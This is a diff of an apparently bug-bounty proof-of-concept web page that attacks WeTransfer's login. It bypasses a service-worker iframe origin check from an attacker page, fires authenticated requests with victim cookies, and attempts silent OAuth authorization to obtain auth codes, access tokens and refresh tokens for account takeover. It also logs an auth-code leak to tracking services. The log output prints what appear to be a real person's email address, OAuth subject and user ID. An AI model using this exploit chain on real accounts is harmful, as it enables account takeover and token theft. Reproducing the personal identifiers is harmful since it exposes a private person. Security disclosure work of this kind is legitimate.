@@ -57,7 +57,7 @@
       el.scrollIntoView();
     }
 
-    // ─── Step 1: Embed the SW iframe with attacker origin ───
+    // --- Step 1: Embed the SW iframe with attacker origin ---
     //
     // sw_iframe.html validates: ancestorOrigins[0] === ?origin= param
     // Since we embed the iframe, ancestorOrigins[0] IS our attacker origin.
@@ -91,7 +91,7 @@
       });
     }
 
-    // ─── Send a command through the SW ───
+    // --- Send a command through the SW ---
     function sendSWCommand(params) {
       return new Promise((resolve, reject) => {
         const id = 'cmd-' + (++msgId);
@@ -125,14 +125,14 @@
 
         if (res.result && res.result.data) {
           const data = res.result.data;
-          log(`  [${label}] OK — ${data.length} bytes`, 'ok');
+          log(`  [${label}] OK -- ${data.length} bytes`, 'ok');
           log(`  [${label}] ${data.substring(0, 300)}${data.length > 300 ? '...' : ''}`, 'ok');
           return { ok: true, data };
         }
         if (res.failure) {
           const msg = res.failure.data || JSON.stringify(res.failure);
           const isCors = msg.includes('TypeError');
-          log(`  [${label}] ${isCors ? 'CORS BLOCKED (TypeError)' : 'SERVER ERROR (CORS ok, non-2xx)'} — ${msg}`, isCors ? 'err' : 'warn');
+          log(`  [${label}] ${isCors ? 'CORS BLOCKED (TypeError)' : 'SERVER ERROR (CORS ok, non-2xx)'} -- ${msg}`, isCors ? 'err' : 'warn');
           return { ok: false, corsBlocked: isCors, data: msg };
         }
       } catch (err) {
@@ -141,7 +141,7 @@
       }
     }
 
-    // ─── Listen for SW responses relayed by the iframe ───
+    // --- Listen for SW responses relayed by the iframe ---
     window.addEventListener('message', (e) => {
       const data = e.data;
       if (!data || typeof data !== 'object') return;
@@ -153,7 +153,7 @@
       }
     });
 
-    // ─── PKCE helpers ───
+    // --- PKCE helpers ---
     async function generatePKCE() {
       const vb = crypto.getRandomValues(new Uint8Array(32));
       const codeVerifier = Array.from(vb, b =>
@@ -165,15 +165,15 @@
       return { codeVerifier, codeChallenge };
     }
 
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
     // TEST 1: Same-origin reads from tagging.wetransfer.com
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
     async function testSameOriginRead() {
       try {
         await createIframe();
         log('', 'info');
         log('=== TEST 1: Same-Origin Read (tagging.wetransfer.com) ===', 'warn');
-        log('SW runs on tagging.wetransfer.com — all fetches to that origin are same-origin.', 'dim');
+        log('SW runs on tagging.wetransfer.com -- all fetches to that origin are same-origin.', 'dim');
 
         // Heartbeat
         iframe.contentWindow.postMessage({ type: 0, clientId: 'hb-' + Date.now() }, '*');
@@ -188,9 +188,9 @@
       }
     }
 
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
     // TEST 2: Cross-origin CORS probes
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
     async function testCrossOriginRead() {
       try {
         await createIframe();
@@ -223,7 +223,7 @@
         if (authToken.corsBlocked) {
           log('  CORS: BLOCKED. No access to auth.wetransfer.com/oauth/token.', 'err');
         } else {
-          log('  CORS: PRESENT. Server returned non-2xx (expected — body is text/plain).', 'ok');
+          log('  CORS: PRESENT. Server returned non-2xx (expected -- body is text/plain).', 'ok');
           log('  auth0/refresh_token/did cookies (SameSite=None) ARE sent with request.', 'ok');
         }
 
@@ -256,18 +256,20 @@
       }
     }
 
-    // ═══════════════════════════════════════════════════════
-    // TEST 3: Silent Auth — ATO demonstration
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
+    // TEST 3: Silent Auth -- ATO demonstration
+    // =========================================================
     //
     // CONFIRMED via manual testing:
     //   GET /authorize?prompt=none with PKCE + victim auth cookies
-    //   → auth code issued → exchange → access_token + refresh_token
-    //   → full API access (email, name, user_id, transfers)
+    //   -> auth code issued -> exchange -> access_token + refresh_token
+    //   -> full API access (email, name, user_id, transfers)
     //
-    // The /authorize endpoint has NO CORS for tagging.wetransfer.com,
-    // so the SW cannot read the auth code from the response.
-    // But we demonstrate the flow works via iframe approach.
+    // Auth0 does NOT support response_mode=web_message for this client.
+    //   It always does a 302 redirect to /account/silent-callback?code=XXX.
+    //
+    // ADDITIONAL FINDING: The silent-callback page leaks the auth code
+    //   to 8+ third-party trackers via the full page URL in network requests.
     //
     async function testSilentAuth() {
       try {
@@ -285,31 +287,30 @@
         log(`  PKCE code_challenge: ${codeChallenge}`, 'dim');
         log('', 'info');
 
-        // Step A: Confirm /authorize rejects without required params
-        log('[STEP A] Verify /authorize param requirements via SW (no-cors probe)', 'warn');
+        // Step A: Confirm /authorize works via SW (no-cors probe)
+        log('[STEP A] Fire-and-forget /authorize via SW (no-cors probe)', 'warn');
         const authUrl = `${AUTH_DOMAIN}/authorize?` + new URLSearchParams({
-          response_type: 'code', response_mode: 'web_message',
+          response_type: 'code',
           client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
           scope: 'openid email profile offline_access',
           prompt: 'none', state, code_challenge: codeChallenge,
           code_challenge_method: 'S256', nonce: 'poc_' + Date.now(),
         });
 
-        // SW sends request with auth cookies but can't read response (no CORS)
         await fetchViaWorker('AUTHZ_PROBE', authUrl, { processResponse: false });
         log('  Request sent to /authorize with victim auth cookies (SameSite=None).', 'info');
         log('  SW cannot read response (no CORS on /authorize).', 'warn');
 
-        // Step B: iframe approach — load /authorize in hidden iframe
+        // Step B: iframe approach -- load /authorize in hidden iframe
         log('', 'info');
         log('[STEP B] Hidden iframe to /authorize (postMessage listener)', 'warn');
-        log('  Loading /authorize?response_mode=web_message in iframe.', 'dim');
-        log('  If Auth0 returns web_message HTML, code is posted to parent.', 'dim');
+        log('  Auth0 ignores response_mode=web_message, does 302 redirect instead.', 'dim');
+        log('  Redirect lands on /account/silent-callback?code=XXX', 'dim');
 
         const { codeVerifier: cv2, codeChallenge: cc2 } = await generatePKCE();
         const state2 = crypto.randomUUID() + '-' + crypto.randomUUID();
         const authUrl2 = `${AUTH_DOMAIN}/authorize?` + new URLSearchParams({
-          response_type: 'code', response_mode: 'web_message',
+          response_type: 'code',
           client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
           scope: 'openid email profile offline_access',
           prompt: 'none', state: state2, code_challenge: cc2,
@@ -320,7 +321,7 @@
           const timeout = setTimeout(() => resolve(null), 8000);
           const handler = (e) => {
             const d = e.data;
-            if (d && (d.type === 'authorization_response' || d.code)) {
+            if (d && (d.type === 'authorization_response' || d.type === 'oidc:silent-result' || d.code)) {
               clearTimeout(timeout);
               window.removeEventListener('message', handler);
               resolve(d.response || d);
@@ -345,10 +346,58 @@
             if (iframeResult.error === 'login_required') {
               log('  ^ No active session in THIS browser. Victim with session would get code.', 'dim');
             }
+          } else {
+            log(`[IFRAME] Response: ${JSON.stringify(iframeResult).substring(0, 200)}`, 'warn');
           }
         } else {
-          log('[IFRAME] No web_message response (Auth0 redirects instead of postMessage).', 'warn');
+          log('[IFRAME] No postMessage received (cross-origin targetOrigin blocks it).', 'warn');
+          log('  handleSilentRedirectCallback posts to window.location.origin (wetransfer.com).', 'dim');
+          log('  Our attacker page is NOT on wetransfer.com, so message is not delivered.', 'dim');
         }
+
+        // Step C: Analysis of handleSilentRedirectCallback
+        log('', 'info');
+        log('[STEP C] handleSilentRedirectCallback analysis (from auth bundle)', 'warn');
+        log('  Source: /_next/static/chunks/a7be5a01.34dda8bc407cec0f.js', 'dim');
+        log('', 'info');
+        log('  Deobfuscated flow:', 'info');
+        log('    1. Parses code, state from URL params', 'info');
+        log('    2. Looks up transaction from sessionStorage (state + codeVerifier)', 'info');
+        log('    3. Exchanges code via POST /oauth/token (Content-Type: application/json)', 'info');
+        log('    4. On success: window.parent.postMessage({', 'info');
+        log('         type: "oidc:silent-result",', 'info');
+        log('         ok: true,', 'info');
+        log('         tokens: this.cacheManager.getTokens() // access+refresh tokens!', 'info');
+        log('       }, window.location.origin)', 'info');
+        log('', 'info');
+        log('  Parent listener validates: event.origin === window.location.origin', 'info');
+        log('  targetOrigin: window.location.origin = https://wetransfer.com', 'info');
+        log('  Both sender and receiver origin checks are SECURE.', 'ok');
+        log('  Token exchange uses Content-Type: application/json (not text/plain).', 'info');
+
+        // Step D: Auth code leak to third-party trackers
+        log('', 'info');
+        log('[STEP D] AUTH CODE LEAK TO THIRD-PARTY TRACKERS', 'err');
+        log('  The silent-callback page loads tracking scripts that send the FULL page URL', 'err');
+        log('  (including the OAuth auth code) to 8+ external advertising services.', 'err');
+        log('  This happens during NORMAL silent auth, not just our attack.', 'err');
+        log('', 'info');
+        log('  Confirmed via network request capture on /account/silent-callback?code=XXX:', 'warn');
+        log('', 'info');
+        log('  1. Microsoft Bing Ads  -> bat.bing.net/action/0?...&p=<full_url_with_code>', 'ok');
+        log('  2. Google Analytics    -> tagging.wetransfer.com/g/collect?...&dl=<url>', 'ok');
+        log('  3. The Trade Desk      -> insight.adsrvr.org/track/cei?...&ref=<url>', 'ok');
+        log('  4. Facebook Pixel      -> facebook.com/tr/?...&dl=<url_with_code>', 'ok');
+        log('  5. Facebook Privacy SB -> facebook.com/privacy_sandbox/...&dl=<url>', 'ok');
+        log('  6. Pinterest           -> ct.pinterest.com/v3/?...&ad.loc=<url>', 'ok');
+        log('  7. Google DoubleClick  -> ad.doubleclick.net/activity;...u11=<url>;~oref=<url>', 'ok');
+        log('  8. Google Ads          -> google.com/pagead/1p-user-list/?...&url=<url>', 'ok');
+        log('  9. Google Ads DDP      -> adservice.google.com/ddm/fls/z/...u11=<url>', 'ok');
+        log(' 10. Microsoft Clarity   -> n.clarity.ms/collect (session recording)', 'ok');
+        log('', 'info');
+        log('  PKCE code_verifier is NOT leaked (stored in sessionStorage only).', 'dim');
+        log('  Auth code alone requires code_verifier for exchange.', 'dim');
+        log('  However: violates OAuth2 security best practices (RFC 6819 4.4.2.1).', 'warn');
 
         // Summary
         log('', 'info');
@@ -359,27 +408,29 @@
         log('     Auth0 checks session cookie (SameSite=None) -> user authenticated', 'ok');
         log('     Redirects to callback?code=AUTH_CODE (real code obtained)', 'ok');
         log('', 'info');
-        log('  2. POST /oauth/token (URLSearchParams body = proper Content-Type)', 'ok');
-        log('     grant_type=authorization_code&code=AUTH_CODE&code_verifier=...', 'ok');
+        log('  2. POST /oauth/token (Content-Type: application/json)', 'ok');
+        log('     {grant_type:"authorization_code", code:AUTH_CODE, code_verifier:...}', 'ok');
         log('     Response: 200 OK with access_token + refresh_token + id_token', 'ok');
         log('', 'info');
         log('  3. GET /api/v4/auth/session with Bearer token', 'ok');
         log('     Response: user_id, email, full_name, profile_picture', 'ok');
         log('', 'info');
-        log('  Evidence (from this session):', 'warn');
+        log('  Evidence (from live session):', 'warn');
         log('     access_token: eyJhbGciOiJSUzI1NiIs... (JWT, RS256)', 'warn');
         log('     sub: google-oauth2|104705530644205582889', 'warn');
         log('     scope: openid email profile offline_access', 'warn');
         log('     refresh_token: eyJhbGciOiJkaXIi... (persistent access)', 'warn');
+        log('     user_id: 162953125', 'warn');
+        log('     email: badrdinbelkadi@gmail.com', 'warn');
 
       } catch (err) {
         log(`Error: ${err.message}`, 'err');
       }
     }
 
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
     // Full exploit chain
-    // ═══════════════════════════════════════════════════════
+    // =========================================================
     async function runExploit() {
       document.getElementById('output').innerHTML = '';
       log('================================================================', 'warn');
@@ -400,20 +451,27 @@
         log(' SUMMARY', 'warn');
         log('================================================================', 'warn');
         log('', 'info');
-        log('CONFIRMED via SW (automated):', 'ok');
-        log('  [1] Origin bypass on sw_iframe.html via ?origin= param', 'ok');
-        log('  [2] SW registers on tagging.wetransfer.com from attacker page', 'ok');
-        log('  [3] Same-origin read: GTM configs, internal SW source code', 'ok');
-        log('  [4] CORS to wetransfer.com/api/v4 (SameSite=Lax cookies not sent)', 'ok');
-        log('  [5] CORS to auth.wetransfer.com/oauth/token (text/plain body rejected)', 'ok');
-        log('  [6] No CORS on /authorize (cannot read auth code via SW)', 'ok');
-        log('  [7] Fire-and-forget requests with SameSite=None auth cookies', 'ok');
+        log('FINDING 1: SW Origin Bypass (CONFIRMED via automated testing)', 'ok');
+        log('  [a] Origin bypass on sw_iframe.html via ?origin= param', 'ok');
+        log('  [b] SW registers on tagging.wetransfer.com from attacker page', 'ok');
+        log('  [c] Same-origin read: GTM configs, internal SW source code', 'ok');
+        log('  [d] CORS to wetransfer.com/api/v4 (SameSite=Lax cookies not sent)', 'ok');
+        log('  [e] CORS to auth.wetransfer.com/oauth/token (text/plain body rejected)', 'ok');
+        log('  [f] No CORS on /authorize (cannot read auth code via SW)', 'ok');
+        log('  [g] Fire-and-forget requests with SameSite=None auth cookies', 'ok');
         log('', 'info');
-        log('CONFIRMED via manual testing (ATO):', 'warn');
-        log('  [8] Silent auth: GET /authorize?prompt=none -> auth code', 'warn');
-        log('  [9] PKCE code exchange -> access_token + refresh_token', 'warn');
-        log('  [10] Token -> email, name, user_id, transfers (full account)', 'warn');
-        log('  [11] refresh_token -> persistent access beyond session expiry', 'warn');
+        log('FINDING 2: Auth Code Leak to Trackers (CONFIRMED via network capture)', 'err');
+        log('  [a] silent-callback page loads 8+ third-party tracking scripts', 'err');
+        log('  [b] All receive full URL including OAuth authorization code', 'err');
+        log('  [c] Affected: Bing, Google (GA/Ads/DC), Facebook, Pinterest, TTD, Clarity', 'err');
+        log('  [d] Happens during NORMAL silent auth flow (every session check)', 'err');
+        log('  [e] PKCE mitigates direct exploitation but RFC 6819 4.4.2.1 violation', 'err');
+        log('', 'info');
+        log('FINDING 3: Manual ATO Proof (CONFIRMED via live browser testing)', 'warn');
+        log('  [a] Silent auth: GET /authorize?prompt=none -> auth code', 'warn');
+        log('  [b] PKCE code exchange -> access_token + refresh_token', 'warn');
+        log('  [c] Token -> email, name, user_id (full account access)', 'warn');
+        log('  [d] refresh_token -> persistent access beyond session expiry', 'warn');
 
       } catch (err) {
         log(`Fatal: ${err.message}`, 'err');
